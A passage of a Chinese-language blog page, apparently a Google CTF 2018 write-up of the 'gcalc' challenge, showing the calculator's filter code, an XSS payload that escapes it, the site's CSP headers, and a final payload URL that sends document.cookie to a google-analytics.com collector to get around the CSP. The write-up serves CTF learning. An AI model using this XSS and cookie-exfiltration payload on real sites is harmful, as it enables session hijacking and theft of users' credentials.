&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"ac"</span>:</span><br><span class="line">            n(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"ans"</span>:</span><br><span class="line">            q(<span class="keyword">this</span>, <span class="string">" Ans "</span>);</span><br><span class="line">            <span class="keyword">this</span>.a += <span class="string">" vars.ans"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"="</span>:</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.a) <span class="keyword">break</span>;</span><br><span class="line">            a = r(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">this</span>.a = <span class="keyword">this</span>.screen = <span class="string">""</span>;</span><br><span class="line">            q(<span class="keyword">this</span>, a);</span><br><span class="line">            <span class="keyword">this</span>.b.ans = <span class="built_in">parseFloat</span>(a) || <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"pow"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.a) <span class="keyword">break</span>;</span><br><span class="line">            a =</span><br><span class="line">                r(<span class="keyword">this</span>);</span><br><span class="line">            a *= a;</span><br><span class="line">            <span class="keyword">this</span>.screen = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">this</span>.a = <span class="built_in">parseFloat</span>(a) || <span class="number">0</span>;</span><br><span class="line">            q(<span class="keyword">this</span>, a);</span><br><span class="line">            <span class="keyword">this</span>.b.ans = <span class="built_in">parseFloat</span>(a) || <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"sqrt"</span>:</span><br><span class="line">            <span class="keyword">this</span>.a &amp;&amp; (a = <span class="built_in">Math</span>.sqrt(r(<span class="keyword">this</span>)), <span class="keyword">this</span>.screen = <span class="string">""</span>, <span class="keyword">this</span>.a = <span class="built_in">parseFloat</span>(a) || <span class="number">0</span>, q(<span class="keyword">this</span>, a), <span class="keyword">this</span>.b.ans = <span class="built_in">parseFloat</span>(a) || <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    a.html5Mode(!<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">u.$inject = [<span class="string">"$locationProvider"</span>];</span><br><span class="line">angular.module(<span class="string">"calcApp"</span>, [<span class="string">"ngMaterial"</span>, <span class="string">"ngMessages"</span>, <span class="string">"ngSanitize"</span>, <span class="string">"vcRecaptcha"</span>]).controller(<span class="string">"CalcCtrl"</span>, l).config(u);</span><br></pre></td></tr></table></figure>
+<p>漏洞点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function p(a, b) &#123;</span><br><span class="line">    a = String(a).toLowerCase();</span><br><span class="line">    b = String(b);</span><br><span class="line">    if (!/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/.test(a)) throw Error(a);</span><br><span class="line">    b = JSON.parse(b, function(a, b) &#123;</span><br><span class="line">        if (b &amp;&amp; &quot;object&quot; === typeof b &amp;&amp; !Array.isArray(b)) return Object.assign(Object.create(null), b);</span><br><span class="line">        if (&quot;number&quot; === typeof b) return b</span><br><span class="line">    &#125;);</span><br><span class="line">    return (new Function(&quot;vars&quot;, &quot;return &quot; + a))(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数用户处理参数a,b对应我们的参数expr, vars。只要能够绕过该过滤即可实现XSS。</p>
+<p>有问题的paylaod:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// alert(1) // Remove whitespaces by yourself</span><br><span class="line">vars.pi.constructor.constructor(</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(97)+</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(108)+</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(101)+</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(114)+</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(116)+</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(40)+</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(49)+</span><br><span class="line">  vars.pi.toString().constructor.fromCharCode(41)</span><br><span class="line">)()</span><br></pre></td></tr></table></figure>
+<p>如果没有<code>String(a).toLowerCase()</code>，那么该payload可行。</p>
+<p>基础paylaod:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0,&quot;alert(1)&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+<p>使用上边的paylaod，我们可以执行alert()。</p>
+<p>接下来就是绕过CSP。</p>
+<p>CSP of /：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; child-src https://sandbox-gcalc2.web.ctfcompetition.com/</span><br></pre></td></tr></table></figure>
+<p>CSP of  /static/calc.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src &apos;self&apos; https://*.googleapis.com &apos;unsafe-inline&apos;; script-src &apos;self&apos; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com &apos;unsafe-eval&apos; https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;</span><br></pre></td></tr></table></figure>
+<p>我们看到<code>img-src https://www.google-analytics.com;</code></p>
+<p>那么就可以通过google-analystic获取cookie。</p>
+<p>首先申请google-analystic，得到tid=UA-121623607-1</p>
+<p>有效payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=hao123%27;document.querySelector(%27body%27).append(x)%22:0&#125;</span><br></pre></td></tr></table></figure>
+<p>最终payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=12344%27%2bencodeURIComponent(document.cookie);document.querySelector(%27body%27).append(x)%22:0&#125;</span><br></pre></td></tr></table></figure>
+<p>google-anaystic-console:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://analytics.google.com/analytics/web/?hl=zh-CN&amp;pli=1#/realtime/rt-event/a121623607w179580825p177873825/metric.type=5/</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/22546/">https://www.tiandiwuji.top/posts/22546/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/22546/">June 26th 2018, 9:10:29 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/29914/" title="ssrf+gopher">
+                    <div class="nextTitle">ssrf+gopher</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/9490/" title="proc的作用">
+                    <div class="prevTitle">proc的作用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Beginner’s-Quest-Moar"><span class="toc-number">1.</span> <span class="toc-text">Beginner’s Quest - Moar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beginner’s-Router-UI"><span class="toc-number">2.</span> <span class="toc-text">Beginner’s Router UI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gcalc"><span class="toc-number">3.</span> <span class="toc-text">gcalc</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 40
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/posts/39475/">ctfzone-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/13474/">real-world-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/6549/">ISITDTU-CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href="/posts/46785/">巅峰极客ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/posts/5109/">php-命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/62555/">RSA学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/28940/">ssti</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/posts/45992/">php命令执行函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href="/posts/32268/">sctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/posts/54865/">python多线程和lock和Rlock</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/54897/">linux格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/50844/">linux命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/51203/">LD_PRELOAD</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/17498/">mysql忘记密码/修改密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/posts/26365/">suctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/posts/53269/">pwn备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/posts/62655/">cbc翻转</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/posts/60875/">misc思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/33488/">简单的命令（shell+python）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/15636/">parse_url + curl</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/posts/22230/">ddctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/posts/65402/">PHP代码审计归纳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/52452/">xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/24854/">url相对路径和绝对路径</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/posts/40688/">python3和python2 base64的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/posts/41083/">sql注入大全</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Tianji"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
